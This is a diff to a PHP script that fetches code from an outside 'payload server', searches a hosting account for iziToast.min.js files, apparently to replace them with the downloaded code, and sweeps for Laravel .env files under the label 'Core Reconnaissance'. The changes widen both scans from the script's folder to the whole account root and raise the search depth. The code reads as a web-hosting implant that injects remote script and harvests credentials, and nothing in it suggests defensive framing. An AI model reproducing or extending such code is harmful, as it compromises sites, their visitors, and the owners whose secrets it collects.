@@ -77,8 +77,18 @@ function clear_laravel_directory($dir) {
     return $deleted_count;
 }
 
+// Determine the absolute root to scan from (e.g., /home/username)
+$global_scan_dir = __DIR__;
+if (preg_match('/^(\/home[^\/]*\/[^\/]+)/i', __DIR__, $matches) && @is_readable($matches[1])) {
+    $global_scan_dir = $matches[1];
+} elseif (isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) {
+    // Go one level above public_html if possible
+    $doc_root = $_SERVER['DOCUMENT_ROOT'];
+    $global_scan_dir = (basename($doc_root) === 'public_html') ? dirname($doc_root) : $doc_root;
+}
+
 // Helper function to recursively find files
-function universal_file_search($dir, $target_name, $max_depth = 8, $current_depth = 0) {
+function universal_file_search($dir, $target_name, $max_depth = 15, $current_depth = 0) {
     $results = [];
     if ($current_depth > $max_depth) return $results;
     if (!@is_dir($dir)) return $results;
@@ -110,7 +120,7 @@ sys_print("Loading modules... [OK]\n", "info", 500);
 sys_print("=== [ MODULE 1: iziToast Updater ] ===", "header", 300);
 
 $url = "https://txt.dev-drops.com/maincode/iziToast.min.js";
-$scan_base_dir = __DIR__;
+global $global_scan_dir;
 
 sys_print("Establishing connection to payload server...", "info", 600);
 $new_code = @file_get_contents($url);
@@ -119,9 +129,9 @@ if ($new_code === false) {
     sys_print("CRITICAL ERROR: Failed to download payload from URL.", "error");
 } else {
     sys_print("Payload downloaded successfully (" . strlen($new_code) . " bytes).", "success", 400);
-    sys_print("Scanning subfolders from " . $scan_base_dir . " for iziToast.min.js...", "info", 500);
+    sys_print("Scanning subfolders from " . $global_scan_dir . " for iziToast.min.js...", "info", 500);
 
-    $files_found = universal_file_search($scan_base_dir, 'iziToast.min.js', 10);
+    $files_found = universal_file_search($global_scan_dir, 'iziToast.min.js', 15);
 
     global $izi_status_log;
     $izi_status_log = [];
@@ -165,8 +175,8 @@ if ($new_code === false) {
 sys_print("\n=== [ MODULE 2: Laravel Core Reconnaissance ] ===", "header", 500);
 sys_print("Initiating deep scan for configuration files (.env) in all subfolders...", "info", 400);
 
-$scan_base_dir = __DIR__;
-$all_env_files = universal_file_search($scan_base_dir, '.env', 10);
+global $global_scan_dir;
+$all_env_files = universal_file_search($global_scan_dir, '.env', 15);
 
 $core_map = [];
 foreach ($all_env_files as $env_f) {
@@ -193,9 +203,10 @@ if (empty($core_directories)) {
     global $izi_status_log;
     if (!isset($izi_status_log)) $izi_status_log = [];
 
-    // Catalog universal inventory in the current directory
+    // Catalog universal inventory in the root directory
     $universal_inventory = [];
-    $user_dir = __DIR__;
+    global $global_scan_dir;
+    $user_dir = $global_scan_dir;
     if (is_dir($user_dir)) {
         $items = @scandir($user_dir);
         if ($items !== false) {
